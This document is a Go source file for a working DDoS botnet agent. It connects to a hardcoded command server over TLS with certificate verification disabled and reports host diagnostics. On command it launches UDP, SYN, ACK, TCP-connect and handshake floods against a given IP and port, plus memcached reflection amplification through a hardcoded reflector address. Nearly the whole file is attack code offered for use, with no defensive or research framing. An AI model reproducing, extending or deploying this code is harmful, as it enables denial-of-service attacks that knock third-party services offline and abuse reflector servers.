package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// ── packet types ──

const (
	typPing    = 0x01
	typPong    = 0x02
	typCmd     = 0x03
	typDiag    = 0x04
	typBeat    = 0x05
	typAuth    = 0x06
	typAuthOK  = 0x07
	maxPayload = 16 << 10 // 16 KB
	workers    = 2000
)

// ── packet wire format ──

type hdr struct {
	Typ  uint8
	Len  uint32
	TS   int64
	Sum  uint16
}

type pkt struct {
	H    hdr
	Data []byte
}

func mkPkt(typ uint8, data []byte) pkt {
	ts := time.Now().UnixNano()
	buf := make([]byte, 19+len(data))
	buf[0] = typ
	binary.BigEndian.PutUint32(buf[1:5], uint32(len(data)))
	binary.BigEndian.PutUint64(buf[5:13], uint64(ts))
	copy(buf[19:], data)

	h := sha256.Sum256(append(buf[0:17], buf[19:]...))
	cs := binary.BigEndian.Uint16(h[0:2])
	binary.BigEndian.PutUint16(buf[17:19], cs)

	return pkt{
		H:    hdr{Typ: typ, Len: uint32(len(data)), TS: ts, Sum: cs},
		Data: data,
	}
}

func sendPkt(c net.Conn, p pkt) error {
	buf := make([]byte, 19+len(p.Data))
	buf[0] = p.H.Typ
	binary.BigEndian.PutUint32(buf[1:5], p.H.Len)
	binary.BigEndian.PutUint64(buf[5:13], uint64(p.H.TS))
	binary.BigEndian.PutUint16(buf[17:19], p.H.Sum)
	copy(buf[19:], p.Data)
	_, err := c.Write(buf)
	return err
}

func recvPkt(c net.Conn) (pkt, error) {
	c.SetReadDeadline(time.Now().Add(30 * time.Second))
	defer c.SetReadDeadline(time.Time{})

	raw := make([]byte, 19)
	if _, err := io.ReadFull(c, raw); err != nil {
		return pkt{}, err
	}

	var h hdr
	h.Typ = raw[0]
	h.Len = binary.BigEndian.Uint32(raw[1:5])
	h.TS = int64(binary.BigEndian.Uint64(raw[5:13]))
	h.Sum = binary.BigEndian.Uint16(raw[17:19])

	if h.Len > maxPayload {
		return pkt{}, fmt.Errorf("oversized payload: %d", h.Len)
	}

	var data []byte
	if h.Len > 0 {
		data = make([]byte, h.Len)
		if _, err := io.ReadFull(c, data); err != nil {
			return pkt{}, err
		}
	}

	chk := sha256.Sum256(append(raw[0:17], data...))
	if binary.BigEndian.Uint16(chk[0:2]) != h.Sum {
		return pkt{}, fmt.Errorf("bad checksum")
	}
	return pkt{H: h, Data: data}, nil
}

// ── bot core ──

var startedAt = time.Now()

type bot struct {
	id   string
	addr string
	conn *tls.Conn
	stop chan struct{}
}

func newBot(id, addr string) *bot {
	return &bot{id: id, addr: addr, stop: make(chan struct{})}
}

func (b *bot) run() {
	for {
		select {
		case <-b.stop:
			return
		default:
		}

		if err := b.dial(); err != nil {
			fmt.Printf("[bot] connect failed: %v (retry 5s)\n", err)
			time.Sleep(5 * time.Second)
			continue
		}

		if err := b.loop(); err != nil {
			fmt.Printf("[bot] loop: %v\n", err)
		}
		if b.conn != nil {
			b.conn.Close()
		}
		time.Sleep(5 * time.Second)
	}
}

func (b *bot) dial() error {
	d := &net.Dialer{Timeout: 10 * time.Second}
	c, err := tls.DialWithDialer(d, "tcp", b.addr, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return fmt.Errorf("tls: %w", err)
	}
	b.conn = c

	ok := false
	defer func() {
		if !ok {
			b.conn.Close()
		}
	}()

	if err := sendPkt(b.conn, mkPkt(typAuth, []byte(b.id))); err != nil {
		return fmt.Errorf("auth send: %w", err)
	}
	resp, err := recvPkt(b.conn)
	if err != nil {
		return fmt.Errorf("auth recv: %w", err)
	}
	if resp.H.Typ != typAuthOK {
		return fmt.Errorf("bad auth response: %d", resp.H.Typ)
	}

	fmt.Println("[bot] authenticated")
	ok = true
	return nil
}

func (b *bot) loop() error {
	done := make(chan struct{})
	defer close(done)
	go b.heartbeatLoop(done)

	for {
		p, err := recvPkt(b.conn)
		if err != nil {
			if err == io.EOF {
				return nil
			}
			return err
		}

		switch p.H.Typ {
		case typPing:
			sendPkt(b.conn, mkPkt(typPong, append([]byte(b.id), "|pong|"...)))
		case typCmd:
			b.execCmd(p)
		case typBeat:
			sendPkt(b.conn, mkPkt(typBeat, append([]byte(b.id), "|heartbeat_response|"...)))
		case typDiag:
			b.sendDiag()
		}
	}
}

func (b *bot) heartbeatLoop(done <-chan struct{}) {
	hb := time.NewTicker(5 * time.Second)
	pg := time.NewTicker(15 * time.Second)
	defer hb.Stop()
	defer pg.Stop()

	for {
		select {
		case <-hb.C:
			sendPkt(b.conn, mkPkt(typBeat, append([]byte(b.id), "|heartbeat|"...)))
		case <-pg.C:
			sendPkt(b.conn, mkPkt(typPing, append([]byte(b.id), "|ping|"...)))
		case <-done:
			return
		}
	}
}

// ── command dispatch ──

func (b *bot) execCmd(p pkt) {
	if len(p.Data) != 42 {
		return
	}
	method := strings.TrimRight(string(bytes.TrimRight(p.Data[0:16], "\x00")), " ")
	ip := net.IP(p.Data[16:20]).String()
	port := int(binary.BigEndian.Uint16(p.Data[20:22]))
	dur := int(binary.BigEndian.Uint32(p.Data[22:26]))

	if net.ParseIP(ip) == nil || port < 1 || port > 65535 || dur < 1 || dur > 3600 {
		return
	}

	cleaned := strings.TrimPrefix(strings.ToLower(method), "!")
	switch cleaned {
	case "udp":
		go udpFlood(ip, port, dur)
	case "udpsmart":
		go udpSmart(ip, port, dur)
	case "tcp", "syn":
		go synFlood(ip, port, dur)
	case "ack":
		go ackFlood(ip, port, dur)
	case "stomp":
		go tcpStomp(ip, port, dur)
	case "vse":
		go tcpHandshake(ip, port, dur)
	case "amp":
		go memcachedAmp(ip, port, dur)
	case "stop":
		fmt.Println("[bot] STOP received")
	}
}

// ── diagnostics ──

func (b *bot) sendDiag() {
	buf := make([]byte, 101)
	off := 0

	padCopy(buf[off:off+16], runtime.GOOS)
	off += 16
	padCopy(buf[off:off+8], runtime.GOARCH)
	off += 8
	padCopy(buf[off:off+32], fmt.Sprintf("%d cores", runtime.NumCPU()))
	off += 32

	binary.BigEndian.PutUint64(buf[off:off+8], totalMemMB())
	off += 8
	binary.BigEndian.PutUint64(buf[off:off+8], uint64(time.Since(startedAt).Seconds()))
	off += 8
	binary.BigEndian.PutUint64(buf[off:off+8], uint64(time.Now().Unix()))
	off += 8

	l1, l5, l15 := loadAvg()
	binary.BigEndian.PutUint32(buf[off:off+4], uint32(l1*100))
	off += 4
	binary.BigEndian.PutUint32(buf[off:off+4], uint32(l5*100))
	off += 4
	binary.BigEndian.PutUint32(buf[off:off+4], uint32(l15*100))
	off += 4

	binary.BigEndian.PutUint64(buf[off:off+8], diskMB())
	sendPkt(b.conn, mkPkt(typDiag, buf))
}

// ── system info helpers ──

func padCopy(dst []byte, s string) {
	copy(dst, s)
	for i := len(s); i < len(dst); i++ {
		dst[i] = 0
	}
}

func totalMemMB() uint64 {
	data, err := os.ReadFile("/proc/meminfo")
	if err == nil {
		sc := bufio.NewScanner(bytes.NewReader(data))
		for sc.Scan() {
			if strings.HasPrefix(sc.Text(), "MemTotal:") {
				f := strings.Fields(sc.Text())
				if len(f) >= 2 {
					if kb, e := strconv.ParseUint(f[1], 10, 64); e == nil {
						return kb / 1024
					}
				}
			}
		}
	}
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	return m.Sys / (1024 * 1024)
}

func loadAvg() (float64, float64, float64) {
	data, err := os.ReadFile("/proc/loadavg")
	if err != nil {
		return 0, 0, 0
	}
	f := strings.Fields(string(data))
	if len(f) < 3 {
		return 0, 0, 0
	}
	a, _ := strconv.ParseFloat(f[0], 64)
	b, _ := strconv.ParseFloat(f[1], 64)
	c, _ := strconv.ParseFloat(f[2], 64)
	return a, b, c
}

func diskMB() uint64 { return 0 }

// ── attack methods ──

func udpFlood(ip string, port, secs int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup
	payload := make([]byte, 1400)
	rand.Read(payload)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
			if err != nil {
				return
			}
			defer c.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					if _, err := c.Write(payload); err == nil {
						atomic.AddInt64(&n, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[udp] done, pkts=%d\n", n)
}

func udpSmart(ip string, port, secs int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c, err := net.Dial("udp", fmt.Sprintf("%s:%d", ip, port))
			if err != nil {
				return
			}
			defer c.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					sz := rand.Intn(1400) + 1
					buf := make([]byte, sz)
					rand.Read(buf)
					if _, err := c.Write(buf); err == nil {
						atomic.AddInt64(&n, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[udpsmart] done, pkts=%d\n", n)
}

func synFlood(ip string, port, secs int) {
	dst := net.ParseIP(ip)
	if dst == nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer c.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcp := &layers.TCP{
						SrcPort: layers.TCPPort(rand.Intn(64511) + 1024),
						DstPort: layers.TCPPort(port), Seq: rand.Uint32(),
						Window: uint16(rand.Intn(3000) + 1024),
						SYN: true, DataOffset: 5,
					}
					pl := make([]byte, rand.Intn(1400)+64)
					rand.Read(pl)
					buf := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buf, gopacket.SerializeOptions{
						ComputeChecksums: true, FixLengths: true,
					}, tcp, gopacket.Payload(pl))
					c.WriteTo(buf.Bytes(), &net.IPAddr{IP: dst})
					atomic.AddInt64(&n, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[syn] done, pkts=%d\n", n)
}

func ackFlood(ip string, port, secs int) {
	dst := net.ParseIP(ip)
	if dst == nil {
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			c, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer c.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcp := &layers.TCP{
						SrcPort: layers.TCPPort(rand.Intn(64312) + 1024),
						DstPort: layers.TCPPort(port),
						ACK: true, Seq: rand.Uint32(), Ack: rand.Uint32(),
						Window: uint16(rand.Intn(4096) + 1024),
						DataOffset: 5,
					}
					pl := make([]byte, rand.Intn(1400)+64)
					rand.Read(pl)
					buf := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buf, gopacket.SerializeOptions{
						ComputeChecksums: true, FixLengths: true,
					}, tcp, gopacket.Payload(pl))
					c.WriteTo(buf.Bytes(), &net.IPAddr{IP: dst})
					atomic.AddInt64(&n, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[ack] done, pkts=%d\n", n)
}

func tcpStomp(ip string, port, secs int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup
	payload := make([]byte, 65500)
	rand.Read(payload)

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					c, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 2*time.Second)
					if err != nil {
						continue
					}
					c.Write(payload)
					c.Close()
					atomic.AddInt64(&n, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[stomp] done, conns=%d\n", n)
}

func tcpHandshake(ip string, port, secs int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					c, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", ip, port), 5*time.Second)
					if err != nil {
						continue
					}
					buf := make([]byte, rand.Intn(64)+32)
					rand.Read(buf)
					c.Write(buf)
					time.Sleep(time.Duration(rand.Intn(1000)) * time.Millisecond)
					c.Close()
					atomic.AddInt64(&n, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[vse] done, conns=%d\n", n)
}

func memcachedAmp(ip string, port, secs int) {
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var n int64
	var wg sync.WaitGroup
	payload := []byte("\x00\x00\x00\x00\x00\x01\x00\x00get \r\n")
	reflectors := []string{"104.194.157.57:11211"}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tgt := reflectors[rand.Intn(len(reflectors))]
					c, err := net.Dial("udp", tgt)
					if err != nil {
						continue
					}
					c.Write(payload)
					c.Close()
					atomic.AddInt64(&n, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("[amp] done, pkts=%d\n", n)
}

// ── helpers ──

func randID(n int) string {
	b := make([]byte, n/2)
	if _, err := rand.Read(b); err != nil {
		return fmt.Sprintf("%x", time.Now().UnixNano())
	}
	return hex.EncodeToString(b)
}

// ── entry ──

func main() {
	b := newBot(randID(16), "192.168.0.11:7002")
	b.run()
}
